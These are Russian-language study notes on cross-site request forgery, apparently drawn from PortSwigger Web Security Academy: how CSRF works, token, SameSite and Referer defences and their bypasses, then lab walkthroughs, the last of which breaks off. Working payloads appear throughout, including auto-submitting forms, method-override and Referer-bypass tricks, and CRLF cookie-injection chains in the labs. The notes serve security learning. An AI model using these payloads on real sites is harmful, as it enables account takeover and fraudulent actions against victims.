## Что такое CSRF?

Cross-site request forgery (CSRF) — это уязвимость веб-безопасности, которая позволяет злоумышленнику побуждать пользователей выполнять действия, которые они не собираются выполнять. Он позволяет злоумышленнику частично обойти одну и ту же политику происхождения, которая предотвращает вмешательство разных сайтов друг в друга.

---

## Каково влияние атаки CSRF?

В успешной CSRF-атаке злоумышленник заставляет жертву непреднамеренно совершить действие. Например, это может быть изменение адреса электронной почты на счёте, изменение пароля или перевод средств. В зависимости от характера действия, злоумышленник может получить полный контроль над аккаунтом пользователя. Если у скомпрометированного пользователя есть привилегированная роль внутри приложения, злоумышленник может получить полный контроль над всеми данными и функционалом приложения.

---

## Как работает CSRF?

>[!tip] Как работает CSRF?
>
>Для возможной атаки по CSRF должны быть соблюдены три ключевых условия:
>
>- **Соответствующее действие**. 
>> В приложении есть действие, которое злоумышленник имеет причину вызвать. Это может быть привилегированное действие (например, изменение прав для других пользователей) или любое действие с конкретными данными пользователя (например, изменение собственного пароля).
>- **Обработка сессий на основе cookie.** 
>> Выполнение этого действия включает отправку одного или нескольких HTTP-запросов, и приложение полностью полагается на сессионные куки для идентификации пользователя, сделавшего запросы. Нет другого механизма для отслеживания сессий или проверки запросов пользователей.
>- **Нет непредсказуемых параметров запроса.** 
>> Запросы, выполняющие это действие, не содержат параметров, значения которых злоумышленник не может определить или предположить. Например, при смене пароля у пользователя функция не уязвима, если злоумышленнику нужно знать значение существующего пароля.

Например, предположим, что в приложении есть функция, позволяющая пользователю изменить адрес электронной почты в своём аккаунте. Когда пользователь выполняет это действие, он делает HTTP-запрос следующим образом:

```http
POST /email/change HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 30 
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE 

email=wiener@normal-user.com
```

Это соответствует требованиям для CSRF:

- Изменение адреса электронной почты пользователя интересно для злоумышленника. После этого злоумышленник обычно может сбросить пароль и полностью получить контроль над аккаунтом пользователя.
- Приложение использует сессионный cookie, чтобы определить, какой пользователь сделал запрос. Нет других токенов или механизмов для отслеживания пользовательских сессий.
- Злоумышленник может легко определить значения параметров запроса, необходимые для выполнения действия.

При соблюдении этих условий злоумышленник может создать веб-страницу, содержащую следующий HTML:

```html
<html>
	<body>
		<form action="https://vulnerable-website.com/email/change" method="POST"> 
			<input type="hidden" name="email" value="pwned@evil-user.net" />
		</form>
		<script>
		document.forms[0].submit();
		</script>
	</body>
</html>
```

Если жертва посетит веб-страницу злоумышленника, произойдёт следующее:

- Страница злоумышленника запускает HTTP-запрос на уязвимый сайт.
- Если пользователь вошёл на уязвимый сайт, его браузер автоматически включит сессионный куки в запрос (при условии, что файлы cookie SameSite не используются).
- Уязвимый сайт обрабатывает запрос обычным способом, рассматривает его как сделанный жертвой пользователя и меняет адрес электронной почты.

> **Примечание:**
>
>Хотя CSRF обычно описывается в контексте обработки сессий на основе cookie, он также возникает в других случаях, когда приложение автоматически добавляет некоторые учетные данные пользователей к запросам, такие как HTTP-Basic аутентификация и аутентификация на основе сертификатов.

---

# Общие защитные механизмы против CSRF

Сегодня успешное обнаружение и эксплуатация уязвимостей CSRF часто связано с обходом анти-CSRF-мер, используемых целевым сайтом, браузером жертвы или обоими. Самые распространённые защитные механизмы, с которыми вы столкнётся, следующие:

- **CSRF-токены** [[CSRF#Что такое CSRF-токен?]]
> **CSRF-токен** — это уникальное, секретное и непредсказуемое значение, которое генерируется серверным приложением и делится с клиентом. При попытке выполнить чувствительное действие, например, отправку формы, клиент должен включить в запрос правильный токен CSRF. Это сильно затрудняет атакующему создание действительного запроса от имени жертвы.
- **Файлы cookie SameSite**
>**SameSite** — это механизм безопасности браузера, который определяет, когда файлы cookie сайта включены в запросы с других сайтов. Поскольку запросы на выполнение чувствительных действий обычно требуют аутентифицированного сессионного cookie, соответствующие ограничения SameSite могут не дать злоумышленнику запускать эти действия на разных сайтах. 
- **Проверка на основе реферера**
> Некоторые приложения используют заголовок HTTP-реферера для попытки защититься от атак CSRF, обычно проверяя, что запрос исходил из собственного домена приложения. Обычно это менее эффективно, чем валидация токена CSRF.

---

## Что такое CSRF-токен?

> **CSRF-токен** — это уникальное, секретное и непредсказуемое значение, которое генерируется серверным приложением и делится с клиентом. При отправке запроса на выполнение чувствительного действия, например, подачи формы, клиент должен включить правильный токен CSRF. В противном случае сервер откажется выполнять запрошенное действие.

Распространённый способ обмена CSRF-токенами с клиентом — включить их в качестве скрытого параметра в HTML-форму, например:

```html
<form name="change-email-form" action="/my-account/change-email" method="POST">
	<label>Email</label>
	<input required type="email" name="email" value="example@normal-website.com">
	<input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
	<button class='button' type='submit'> Update email </button> 
</form>
```

Отправка этой формы приводит к следующему запросу:

```http
POST /my-account/change-email HTTP/1.1 
Host: normal-website.com 
Content-Length: 70 
Content-Type: application/x-www-form-urlencoded 

csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com
```

При правильной реализации токены CSRF помогают защититься от атак CSRF, затрудняя злоумышленнику создание действительного запроса от имени жертвы. Поскольку злоумышленник не может предсказать правильное значение токена CSRF, он не сможет включить его в вредоносный запрос.

> **Примечание:**
> 
>CSRF-токены не обязательно должны быть отправлены как скрытые параметры в `POST` запросах. Некоторые приложения, например, размещают CSRF-токены в HTTP-заголовках. Способ передачи токенов существенно влияет на безопасность механизма в целом.

---

## Ограничения на файлы cookie: #SameSite

SameSite — это механизм безопасности браузера, который определяет, когда файлы cookie сайта включены в запросы, исходящие от других сайтов. Ограничения cookie SameSite обеспечивают частичную защиту от различных межсайтовых атак, включая CSRF, утечки между сайтами и некоторые эксплойты CORS.

С 2021 года Chrome по умолчанию применяет ограничения SameSite `Lax`, если сайт, выпускающий файл cookie, явно не устанавливает свой собственный уровень ограничений. Это предлагаемый стандарт, и мы ожидаем, что другие крупные браузеры в будущем примут подобное поведение. Поэтому крайне важно хорошо понимать, как работают эти ограничения, а также как их можно обойти, чтобы тщательно проверить векторы атак между сайтами. 

---

### Что такое site в контексте файлов cookie SameSite?

В контексте ограничений cookie SameSite сайт определяется как домен верхнего уровня (TLD) вроде `.com` или `.net`, плюс ещё один уровень доменного имени. Это часто называют TLD+1. 

При определении same-site в запросе также учитывается схема URL. Это означает, что ссылка из `http://app.example.com` на `https://app.example.com` рассматривается большинством браузеров как кросс-сайт. 

![[Pasted image 20250114182435.png]]

> **Примечание:**
>
>Вы можете столкнуться с термином «эффективный домен верхнего уровня» ("effective top-level domain" eTLD). Это просто способ учесть зарезервированные многокомпонентные суффиксы, которые на практике рассматриваются как домены верхнего уровня, например `.co.uk`. 

---

#### В чём разница между site и origin?

Разница между site и origin — это их охват:

>Сайт включает несколько доменных имён, тогда как Origin включает только одно. 
>> *Хотя они тесно связаны, важно не использовать эти термины как синонимы, так как смешение может иметь серьёзные последствия для безопасности.*

Два URL считаются имеющими одинаковый same origin, если у них абсолютно одна и та же схема, доменное имя и порт. Однако обратите внимание, что порт часто выводится из схемы.

| **Запрос от**             | **Запрос к**                   | **Same-site?** | **Same-origin?**       |
| ------------------------- | ------------------------------ | ---------------------------- | ------------------------------- |
| `https://example.com`     | `https://example.com`          | Да                           | Да                              |
| `https://app.example.com` | `https://intranet.example.com` | Да                           | Нет: несовпадающее доменное имя |
| `https://example.com`     | `https://example.com:8080`     | Да                           | Нет: порт с несоответствием     |
| `https://example.com`     | `https://example.co.uk`        | Нет: несовпадающий eTLD      | Нет: несовпадающее доменное имя |
| `https://example.com`     | `http://example.com`           | Нет: несовпадающая схема     | Нет: несовпадающая схема        |

Это важное различие, поскольку оно означает, что любая уязвимость, позволяющая произвольное выполнение JavaScript, может быть использована для обхода site-based защитных мер на других доменах, принадлежащих тому же сайту.

---

### Как работает SameSite?

До введения механизма SameSite браузеры отправляли cookies в каждом запросе домену, который их выпустил, даже если запрос запускался не связанным сторонним сайтом. SameSite работает, позволяя браузерам и владельцам сайтов ограничивать, какие запросы между сайтами, если таковые есть, должны содержать конкретные файлы cookie. Это помогает снизить риск использования пользователей в атаках CSRF, которые побуждают браузер жертвы отправлять запрос, вызывающий вредоносное действие на уязвимом сайте. Поскольку такие запросы обычно требуют cookie, связанного с аутентифицированной сессией жертвы, атака провалится, если браузер не включит эту функцию.

Все основные браузеры в настоящее время поддерживают следующие уровни ограничений SameSite:
- `Strict`
- `Lax`
- `None`

Разработчики могут вручную настроить уровень ограничения для каждого установленного ими куки, что даёт им больше контроля над использованием этих файлов. Для этого им достаточно включить атрибут`SameSite` в заголовок ответа `Set-Cookie` вместе с предпочтительным значением: 

```http
Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict
```

Хотя это обеспечивает некоторую защиту от атак CSRF, ни одно из этих ограничений не гарантирует полную защиту.

> **Примечание:**
>
>Если сайт, выпускающий куки, явно не устанавливает атрибут `SameSite`, Chrome автоматически накладывает `Lax` ограничение по умолчанию. Это означает, что файлы cookie отправляются только в межсайтовых запросах, соответствующих определённым критериям, хотя разработчики никогда не настраивали такое поведение. 

---

#### Strict

> [!note] 
> 
> Если куки установлен с атрибутом `SameSite=Strict`, браузеры не будут отправлять его в межсайтовых запросах. 
> > Проще говоря, это означает, что если целевой сайт не совпадает с сайтом, который сейчас отображается в адресной строке браузера, он не будет включать файл cookie. 

Это рекомендуется при установке файлов cookie, позволяющих носителю изменять данные или выполнять другие чувствительные действия, например, доступ к определённым страницам, доступным только аутентифицированным пользователям.

Хотя это самый безопасный вариант, он может негативно сказаться на пользовательском опыте в случаях, когда кросс-сайтовая функциональность желательна.

---

#### Lax

> [!note] 
> 
> `Lax` ограничения SameSite означают, что браузеры будут отправлять файлы cookie в межсайтовых запросах, но только при выполнении обоих следующих условий:
> - Запрос использует метод `GET`. 
> - Запрос возникал в результате top-level навигации пользователя, например, клика по ссылке.

Это означает, что, например, файл cookie не включается в cross-site `POST` запросы. Поскольку `POST` запросы обычно используются для действий, изменяющих данные или состояние (по крайней мере, согласно лучшей практике), они гораздо чаще становятся целью CSRF-атак. 

Аналогично, куки не включается в фоновые запросы, такие как те, что инициируются скриптами, iframe или ссылками на изображения и другие ресурсы.

---

#### None

> [!note] 
> 
> Если куки установлен с атрибутом `SameSite=None`, это полностью отключает ограничения SameSite, независимо от браузера. 
> > В результате браузеры будут отправлять этот файл cookie во всех запросах на сайт, который его выпустил, даже те, которые были спровоцированы совершенно не связанными сторонними сайтами. 

За исключением Chrome, это поведение по умолчанию, используемое крупными браузерами, если при установке куки не указано атрибут `SameSite`. 

> Существуют веские причины для отключения SameSite, например, если файл cookie предназначен для использования из стороннего контекста и не предоставляет носителю доступ к каким-либо конфиденциальным данным или функциональности. Tracking cookies — типичный пример.

Если вы столкнётесь с набором файлов cookie с явными ограничениями `SameSite=None` или без них, стоит проверить, насколько он полезен. Когда Chrome впервые внедрил поведение «Lax-by-default», это привело к побочным эффектам поломки большой части существующей веб-функциональности. В качестве быстрого обходного пути некоторые сайты решили просто отключить ограничения SameSite на все файлы cookie, включая потенциально чувствительные. 

При установке файла cookie с `SameSite=None`, сайт также должен включать атрибут `Secure`, который гарантирует, что файл cookie отправляется только в зашифрованных сообщениях по HTTPS. В противном случае браузеры отклонят куки, и он не будет настроен. 

```http
Set-Cookie: trackingId=0F8tgdOhi9ynR1M9wa3ODa; SameSite=None; Secure
```

---

# Как построить CSRF-атаку

---

## Burp CSRF PoC

Ручное создание HTML, необходимого для эксплойта CSRF, может быть громоздким, особенно если желаемый запрос содержит большое количество параметров или есть другие особенности. Самый простой способ построить эксплойт CSRF — использовать генератор PoC CSRF, встроенный в Burp Suite Professional:

- Выберите запрос в любом месте в Burp Suite Professional, который вы хотите протестировать или использовать.
- В контекстном меню правой кнопки мыши выберите Engagement tools / Generate CSRF PoC.
- Burp Suite генерирует HTML, который запускает выбранный запрос (за исключением куки, которые автоматически добавляются браузером жертвы).
- Вы можете настраивать различные параметры в генераторе CSRF PoC, чтобы тонко настроить аспекты атаки. Возможно, вам придётся делать это в некоторых необычных ситуациях, чтобы справиться с необычными особенностями запросов.
- Скопируйте сгенерированный HTML на веб-страницу, просмотрите его в браузере, который входит в уязвимый сайт, и проверьте, выполнен ли запланированный запрос успешно и выполнено ли желаемое действие.

---

## Как реализовать эксплойт CSRF

Механизмы доставки атак на подделку запросов между сайтами по сути такие же, как и для отражённого XSS. Обычно злоумышленник размещает вредоносный HTML на контролируемом им сайте и затем побуждает жертв посетить этот сайт. Это можно сделать, отправив пользователю ссылку на сайт через электронную почту или сообщение в социальных сетях. Или если атака была совершена на популярном сайте (например, в комментарии пользователя), они могут просто ждать, пока пользователи зайдут на сайт.

Обратите внимание, что некоторые простые эксплойты CSRF используют метод GET и могут быть полностью автономными с одним URL на уязвимом сайте. В такой ситуации злоумышленнику может не понадобиться использование внешнего сайта, и он может напрямую передавать жертвам вредоносный URL на уязвимом домене. В приведённом примере, если запрос на изменение адреса электронной почты можно выполнить с помощью метода GET, то самостоятельная атака будет выглядеть так:

```html
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
```

---

## Распространённые недостатки валидации CSRF-токена

Уязвимости CSRF обычно возникают из-за ошибок в проверке токенов CSRF. 

---

### 1. Валидация токена CSRF зависит от метода запроса

Некоторые приложения правильно проверяют токен при использовании метода POST, но пропускают валидацию при использовании метода GET.

В этой ситуации злоумышленник может переключиться на метод GET, чтобы обойти валидацию и нанести CSRF-атаку:

```http
GET /email/change?email=pwned@evil-user.net HTTP/1.1 
Host: vulnerable-website.com 
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```

---

### 2. Валидация токена CSRF зависит от наличия токена

Некоторые приложения корректно проверяют токен при его присутствии, но пропускают проверку, если токен отсутствует.

В такой ситуации злоумышленник может удалить весь параметр, содержащий токен (не только его значение), чтобы обойти валидацию и нанести CSRF-атаку:

```http
POST /email/change HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 25 
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm 

email=pwned@evil-user.net
```

---

### 3. CSRF-токен не привязан к пользовательской сессии

Некоторые приложения не проверяют, что токен принадлежит той же сессии, что и пользователь, который делает запрос. Вместо этого приложение поддерживает глобальный пул токенов, которые оно выпустило, и принимает любой токен, появляющийся в этом пуле.

В такой ситуации злоумышленник может войти в приложение через свой аккаунт, получить действительный токен и затем передать этот токен жертве в своей CSRF-атаке.

---

### 4. CSRF-токен привязан к несессионному cookie

В вариации предыдущей уязвимости некоторые приложения связывают CSRF-токен с куки, но не с тем же куки, который используется для отслеживания сессий. Это может произойти, когда приложение использует два разных фреймворка — один для обработки сессий, другой для защиты CSRF, которые не интегрированы вместе:

```http
POST /email/change HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded Content-Length: 68 
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv 

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```

Эту ситуацию сложнее использовать, но она всё равно уязвима. Если на сайте присутствует поведение, позволяющее злоумышленнику установить куки в браузере жертвы, то возможна атака. Злоумышленник может войти в приложение через свой аккаунт, получить действительный токен и соответствующий куки, использовать поведение настройки cookie, чтобы разместить куки в браузере жертвы, и перенести свой токен жертве в результате CSRF-атаки.

> **Примечание:**
>
>Поведение при настройке файлов cookie даже не обязательно должно существовать внутри того же веб-приложения, что и уязвимость CSRF. Любое другое приложение в рамках того же общего DNS-домена потенциально может быть использовано для установки cookie в целевом приложении, если управляемый куки имеет подходящий обхват. Например, функция настройки cookie на `staging.demo.normal-website.com` может быть использована для размещения куки, отправленного в `secure.normal-website.com`. 

---

### 5. CSRF-токен просто дублируется в cookie

В дальнейшем варианте предыдущей уязвимости некоторые приложения не ведут серверную запись о выданных токенах, а дублируют каждый токен внутри куки и параметра запроса. При проверке следующего запроса приложение просто проверяет, что токен, введённый в параметре запроса, совпадает с значением, указанным в куки. Это иногда называют защитой «двойной отправки» против CSRF, и рекомендуется потому, что она простая в реализации и избегает необходимости в серверном состоянии:

```http
POST /email/change HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 68 
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa 

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```

В этой ситуации злоумышленник может снова выполнить CSRF-атаку, если на сайте есть функция настройки cookie. Здесь злоумышленнику не нужно получать собственный действительный токен. Они просто изобретают токен (возможно, в нужном формате, если это проверяется), используют поведение настройки cookie, чтобы вместить свой cookie в браузер жертвы, и подать свой токен жертве в CSRF-атаке.

---

## Обход SameSite защиты

---

### Обход SameSite Lax ограничений с помощью GET-запросов

На практике серверы не всегда придирчивы к тому, получают ли они запрос `GET` или `POST` на конкретный эндпоинт, даже если они ожидают отправку формы. Если сайты используют `Lax` ограничения для своих сессионных файлов cookie, явно или из-за стандартного использования браузера, вы всё равно можете выполнить CSRF-атаку, вызвав запрос из браузера жертвы. 

Пока запрос включает навигацию на верхнем уровне, браузер всё равно будет включать сессионный cookie жертвы. Ниже приведён один из самых простых способов запуска такой атаки:

```html
<script>document.location='https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';</script>
```

Даже если обычный `GET` запрос не разрешен, некоторые фреймворки предлагают способы отмены метода, указанного в строке запроса. Например, Symfony поддерживает параметр `_method` в формах, которые имеют приоритет над обычным методом для целей маршрутизации: 

```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
	<input type="hidden" name="_method" value="GET">
	<input type="hidden" name="recipient" value="hacker">
	<input type="hidden" name="amount" value="1000000">
</form>
```

Другие фреймворки поддерживают ряд похожих параметров.

---

### Обход ограничений SameSite с помощью on-site gadgets

Если куки установлен с атрибутом `SameSite=Strict`, браузеры не включают его в запросы между сайтами. Возможно, вы сможете обойти это ограничение, если найдёте gadget, который приводит к второму запросу на том же сайте. 

> [!note] 
> Одним из возможных гаджетов является **redirect**, который динамически строит цель перенаправления с помощью управляемых атакующим входов, таких как параметры URL. 

> Что касается браузеров, эти перенаправления на стороне клиента вовсе не являются перенаправлениями; Полученный запрос рассматривается как обычный, самостоятельный запрос. Самое главное — это запрос на тот же сайт, который, следовательно, будет включать все файлы cookie, связанные с сайтом, независимо от установленных ограничений.

Если вы сможете использовать этот гаджет для получения злонамеренного вторичного запроса, это позволит полностью обойти любые ограничения cookie SameSite.

> Обратите внимание, что аналогичная атака невозможна при серверных перенаправлениях. В этом случае браузеры распознают, что запрос на перенаправление изначально был результатом cross-site запроса, поэтому они всё равно применяют соответствующие ограничения cookie.

---

### Обход ограничений SameSite через уязвимые сабдомены

Независимо от того, тестируете ли вы чужой сайт или пытаетесь защитить свой собственный, важно помнить, что запрос может оставаться same-site, даже если он отправлен через cross-origin.

Убедитесь, что вы тщательно проверили все доступные поверхности для атаки, включая любые сабдомены. В частности, уязвимости, позволяющие вызвать произвольный вторичный запрос, такие как XSS, могут полностью скомпрометировать защиту, основанную на сайтах, подвергая все домены сайта межсайтовым атакам.

В дополнение к классическому CSRF, не забывайте, что если целевой сайт поддерживает WebSockets, эта функция может быть уязвима к кросс-сайтовому захвату WebSocket (CSWSH), который по сути является CSRF-атакой, направленной на WebSocket handshake. 

---

### Обход ограничений SameSite Lax с помощью новых файлов cookie

Файлы cookie с ограничением SameSite `Lax` обычно не отправляются в межсайтовых `POST` запросах, но есть некоторые исключения. 

Как уже упоминалось, если сайт не содержит `SameSite` атрибута при установке cookie, Chrome автоматически накладывает `Lax` ограничения по умолчанию. Однако, чтобы избежать нарушения механизмов единого входа (SSO), он фактически не применяет эти ограничения в первые 120 секунд для `POST` запросов верхнего уровня. В результате существует двухминутное окно, в течение которого пользователи могут быть уязвимы к межсайтовым атакам. 

> Примечание
>
>Это двухминутное окно не распространяется на файлы cookie, которые явно были установлены с атрибутом `SameSite=Lax`. 

Пытаться рассчитать момент атаки в этот короткий период, довольно непрактично. С другой стороны, если вы найдёте на сайте гаджет, который позволяет заставить жертву получить новый сессионный куки, вы можете заранее обновить её cookie перед основной атакой. Например, завершение процесса входа на основе OAuth может привести к новой сессии каждый раз, так как сервис OAuth не обязательно знает, входит ли пользователь на целевой сайт.

Чтобы инициировать обновление cookie без необходимости вручную входить, необходимо использовать навигацию верхнего уровня, которая гарантирует, что файлы cookie, связанные с текущей сессией OAuth, включены. Это создаёт дополнительную сложность, так как вам нужно перенаправить пользователя обратно на ваш сайт, чтобы запустить CSRF-атаку.

В качестве альтернативы можно активировать обновление cookie с новой вкладки, чтобы браузер не покинул страницу до того, как вы сможете выполнить финальную атаку. Небольшой недостаток такого подхода — браузеры блокируют всплывающие вкладки, если они не открыты вручную. Например, следующее всплывающее окно будет заблокировано браузером по умолчанию:

```js
window.open('https://vulnerable-website.com/login/sso');
```

Чтобы обойти это, вы можете обернуть оператор в обработчик событий `onclick` следующим образом: 

`window.onclick = () => { window.open('https://vulnerable-website.com/login/sso'); }`

Таким образом, метод  `window.open()` запускается только тогда, когда пользователь кликает где-то на странице.

---

## Обход защиты CSRF на основе рефереров

Помимо средств защиты, использующих CSRF-токены, некоторые приложения используют заголовок HTTP `Referer` для попытки защититься от атак CSRF, обычно проверяя, что запрос исходил из собственного домена приложения. Этот подход, как правило, менее эффективен и часто подвержен обходу. 

> **Заголовок реферера**
>
>Заголовок HTTP Referer — это необязательный заголовок запроса, содержащий URL веб-страницы, связанной с запрашиваемым ресурсом. Обычно браузеры автоматически добавляются, когда пользователь запускает HTTP-запрос, включая клик по ссылке или отправку формы. Существуют различные методы, позволяющие странице ссылки удерживать или изменять значение заголовка `Referer`. Часто это делается из соображений конфиденциальности. 

---

### Валидация реферера зависит от наличия заголовка

Некоторые приложения проверяют заголовок `Referer`, когда он присутствует в запросах, но пропускают проверку, если заголовок отсутствует. 

В этой ситуации злоумышленник может создать свой CSRF-эксплойт так, чтобы браузер пользователя-жертвы сбросил заголовок `Referer` в полученном запросе. Существует несколько способов этого добиться, но самый простой — использовать метку META внутри HTML-страницы, где размещена атака CSRF: 

```html
<meta name="referrer" content="never">
```

---

### Валидация реферера может быть обойдена

Некоторые приложения наивно проверяют заголовок `Referer`, который можно обойти. Например, если приложение проверяет, домен в начале `Referer` с ожидаемым значением, злоумышленник может поместить его как поддомен своего собственного домена: 

```
http://vulnerable-website.com.attacker-website.com/csrf-attack
```

Аналогично, если приложение просто проверяет, что `Referer` содержит конкретное доменное имя, злоумышленник может ввести необходимое значение в другом месте URL: 

```
http://attacker-website.com/csrf-attack?vulnerable-website.com
```

> **Примечание:**
>
>Хотя вы можете определить это поведение с помощью Burp, часто этот подход перестаёт работать при тестировании концепции в браузере. В попытке снизить риск утечки чувствительных данных таким образом многие браузеры теперь по умолчанию удаляют query строку запроса из заголовка `Referer`. 
>
>Вы можете обойти это поведение, вставив в ответ с вашим эксплойтом заголовок `Referrer-Policy: unsafe-url` (обратите внимание, что в данном случае `Referrer` написан правильно с двумя `rr`!). Это гарантирует, что полный URL будет отправлен, включая строку запроса. 

---

# Лабораторные

---

## Lab: CSRF vulnerability with no defenses

https://portswigger.net/web-security/learning-paths/csrf/csrf-how-to-construct-a-csrf-attack/csrf/lab-no-defenses#

В запросе `POST /my-account/change-email`: Engagement tools / Generate CSRF PoC.

---

## Lab: CSRF where token validation depends on request method

https://portswigger.net/web-security/learning-paths/csrf/csrf-common-flaws-in-csrf-token-validation/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method

1. В запросе `POST /my-account/change-email` используем "Change request method" (успешно работает).
2. Engagement tools / Generate CSRF PoC.

---

## Lab: CSRF where token validation depends on token being present

https://portswigger.net/web-security/learning-paths/csrf/csrf-common-flaws-in-csrf-token-validation/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present

1. В запросе `POST /my-account/change-email` удаляем csrf-токен;
2. Engagement tools / Generate CSRF PoC.

---

## Lab: CSRF where token is not tied to user session

https://portswigger.net/web-security/learning-paths/csrf/csrf-common-flaws-in-csrf-token-validation/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session#

1. Перехватываем `POST /my-account/change-email` в Intercept;
2. Engagement tools / Generate CSRF PoC.

---

## Lab: CSRF where token is tied to non-session cookie

https://portswigger.net/web-security/learning-paths/csrf/csrf-common-flaws-in-csrf-token-validation/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie

1. В запросе `POST /my-account/change-email` на разных аккаунтах замечаем одинаковые CSRF токен в cookie и POST параметр CSRF (я думаю, что это недочёт лабы, поэтому решим полноценно по мужски);
2. Ищем способ выдать пользователю свою cookie: замечаем CRLF инъекцию в `GET /?search=qwe`. Формируем запрос, выставляющий куки:
   > ```
   > search=qwe%0d%0aSet-Cookie: csrfKey=YOUR-KEY; SameSite=None
   > ```
   > Кодируем в URL (Ctrl+U) всё, кроме `%0d%0a` и копируем URL:
   > ```
   > https://YOUR-LAB-ID.web-security-academy.net/?search=qwe%0d%0aSet-Cookie:+csrfKey%3dtZ6oMFdQPmMZgi4zrcr9aoKc3gS0FhtJ%3b+SameSite%3dNone%3b+SameSite%3dNone
   > ```
3. От запроса `POST /my-account/change-email` выполняем Engagement tools / Generate CSRF PoC. 
4. В PoC перед формой вставляем полученную ранее CRLF для GET запросы:
   >```html
   ><img src='https://YOUR-LAB-ID.web-security-academy.net/?search=qwe%0d%0aSet-Cookie:+csrfKey%3dtZ6oMFdQPmMZgi4zrcr9aoKc3gS0FhtJ%3b+SameSite%3dNone' onerror=document.forms[0].submit()>
   >```
   
   Итог:
``` html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="000&#64;xss" />
      <input type="hidden" name="csrf" value="YOUR-KEY" />
      <input type="submit" value="Submit request" />
    </form>

    <img src='https://YOUR-LAB-ID.web-security-academy.net/?search=qwe%0d%0aSet-Cookie:+csrfKey%3dYOUR-KEY%3b+SameSite%3dNone'  onerror="document.forms[0].submit()">
  </body>
</html>
```

---

## Lab: CSRF where token is duplicated in cookie

https://portswigger.net/web-security/learning-paths/csrf/csrf-common-flaws-in-csrf-token-validation/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie#

1. Перехватываем `POST /my-account/change-email` в Intercept;
2. Замечаем, что запрос будет всегда успешных, если POST параметр `csrf=...` будет равен Cookie `csrf=...` при любых значениях;
3. От `POST /my-account/change-email` Engagement tools / Generate CSRF PoC;
4. На странице `GET /?search=qwe` обнаруживаем CRLF и выставляем Cookie `csrf=123`:
   > ```http
   > GET /?search=qwe%0d%0aSet-Cookie:+csrf=123;+SameSite%3dNone HTTP/2
   > ```
   > Копируем URL:
   > ``` 
   > https://YOUR-LAB-ID.web-security-academy.net/?search=qwe%0d%0aSet-Cookie:+csrf=123%3b+SameSite%3dNone
   > ```
5. Вставляем эксплойт на эксплойт сервер:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="000&#64;xss" />
      <input type="hidden" name="csrf" value="123" />
      <input type="submit" value="Submit request" />
    </form>

    <img src='https://YOUR-LAB-ID.web-security-academy.net/?search=qwe%0d%0aSet-Cookie:+csrf=123%3b+SameSite%3dNone'  onerror="document.forms[0].submit()">
  </body>
</html>
```

---

## Lab: SameSite Lax bypass via method override

https://portswigger.net/web-security/learning-paths/csrf/csrf-bypassing-samesite-lax-restrictions-using-get-requests/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override

1. Изучаем `POST /my-account/change-email`: CSRF токенов нет, есть лишь sesion-cookie без SameSite (значит браузер может подставлять SameSite=Lax сам);
2. Базовая смена `POST` метода на `GET` не работает: `405 Method Not Allowed`;
3. Пробуем сменить GET метод на POST через GET-параметры:
   > 1. Отправляем запрос в Intruder, берём значения из [SecLists/burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt):
   >    ```http
   >    GET /my-account/change-email?email=x1%40xss&§param§=qwe HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=2SyCr4OOy4L8dRXkvumB3JdOW9lCy7X3
   >    ```
   >    
   >    Успешно подбираем параметр `_method`:
   >    
   >    ![[Pasted image 20260123162000.png]]
   >    
   >    Пробуем дать ему значение `POST` - успех.
4. От полученного запроса формируем PoC: Engagement tools / Generate CSRF PoC.

---

## Lab: SameSite Strict bypass via client-side redirect

https://portswigger.net/web-security/learning-paths/csrf/csrf-bypassing-samesite-restrictions-using-on-site-gadgets/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect

1. Изучаем `POST /my-account/change-email`: CSRF токенов нет, но есть sesion-cookie с SameSite=Struct);
2. Базовая смена `POST` метода на `GET` работает, значит нужно найти возможность выполнить `GET` запрос **с** уязвимого сайта;
3. Потыкаем всё на сайте. В Burp Target -> Site map изучив файлы. В JS файлах видим функцию:
   ``` js
   redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
   ```
   > 1. Догадываемся, что она вызывается из `YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=...`
   > 2. Принимает значение страницы из параметра `postId`.
   > 3. Opren-redirect уязвимость найдена.
